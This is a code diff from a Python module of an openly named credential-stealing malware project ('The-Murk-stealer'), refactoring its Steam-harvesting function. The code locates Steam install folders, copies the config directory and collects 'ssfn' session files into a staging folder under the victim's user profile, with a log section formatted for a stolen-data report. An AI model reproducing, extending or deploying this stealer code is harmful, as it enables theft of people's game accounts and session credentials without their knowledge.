@@ -10,25 +10,27 @@
 #             https://github.com/Nick-Vinesmoke/The-Murk-stealer              #
 #-----------------------------------------------------------------------------#
 
-from os import environ, sep,path,listdir
+from os import environ,path,listdir
 from shutil import copytree,copy
 from manager.logger import Log
+from preferences.config import config
 
 
-path2 = r'C:\Program Files\Steam'
-path02 = r'C:\Program Files\Steam\config'
-path3 = r'C:\Program Files (x86)\Steam'
-path03 = r'C:\Program Files (x86)\Steam\config'
 
 def Steam():
+    path2 = r'C:\Program Files\Steam'
+    path02 = r'C:\Program Files\Steam\config'
+    path3 = r'C:\Program Files (x86)\Steam'
+    path03 = r'C:\Program Files (x86)\Steam\config'
     try:
         msgInfo = ""
         msgInfo+="\n\n<b>🕹Games🕹</b>"
         Log("===========Games===========")
         try:
-            pathtofile = environ['USERPROFILE'] + sep + r'AppData\Local'
-            directory = rf'{pathtofile}\windll\Games\Steam\config'
-            directory2 = rf'{pathtofile}\windll\Games\Steam'
+            user = environ['USERPROFILE']
+            pathtofile = f'{user}\\{config.pathToLogs}'
+            directory = f'{pathtofile}\\Games\\Steam\\config'
+            directory2 = f'{pathtofile}\\Games\\Steam'
             files2 = [i for i in listdir(path2) if path.isfile(path.join(path2,i)) and \
             'ssfn' in i]
             copytree(path02, directory)
